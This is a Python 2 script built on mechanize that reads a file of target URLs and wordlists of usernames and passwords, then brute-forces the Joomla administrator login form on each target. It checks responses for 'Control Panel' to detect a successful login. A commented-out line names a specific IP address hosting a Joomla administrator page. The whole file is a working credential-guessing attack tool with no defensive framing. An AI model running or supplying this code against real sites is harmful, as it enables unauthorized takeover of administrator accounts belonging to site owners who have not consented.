#!/usr/bin/python
import mechanize

# page = urllib.urlopen("http://109.123.90.187/joomlatest/administrator")
# login = BeautifulSoup(page.read(), "lxml")
#
# print page.code

error = ["Username and password do not match or you do not have an account yet.", "LADP"]
sussuc = "Control Panel"
br = mechanize.Browser()
br.set_handle_robots(False)
fopen = open("/root/PycharmProjects/untitled/project/scanner/t.txt", "r")
username = open("/root/PycharmProjects/untitled/project/scanner/username.txt", "r")
passw = open("/root/PycharmProjects/untitled/project/scanner/password.txt", "r")

userlist = username.readlines()
passlist = passw.readlines()
# tt = username.readlines()
# bb = passw.readlines()
#
# print tt
# print bb

for line in fopen.readlines():
    logged = False
    print line.strip()

    try:
        page = br.open(line.strip(), timeout=5)
        print "URL OPENED"

    except:
        print "Error ocurred"
        pass


    for form in br.forms():

        # try:

        for u in userlist:
            if logged == False:
                for p in passlist:

                    br.select_form(nr=0)
                    print "trying user: %s and password: %s" % (u, p)
                    br.form["username"] = u
                    br.form["passwd"] = p
                    br.submit()
                    readingPage = br.response().read()
                    if sussuc in readingPage:
                        logged = True
                        print "succefully loggen in!\n ---------------------------------"
                    else:
                        print "Wrong credentials\n ----------------------------------------"
                    # for i in error:
                    #     if i in readingPage:
                    #         print "wrong credential"
                    #     # elif sussuc in readingPage:
                    #     else:
                    #         logged = True
                    #         print "success"


        # except:
        #          print "I'm out of the loop"
        # pass
passw.close()
username.close()
fopen.close()
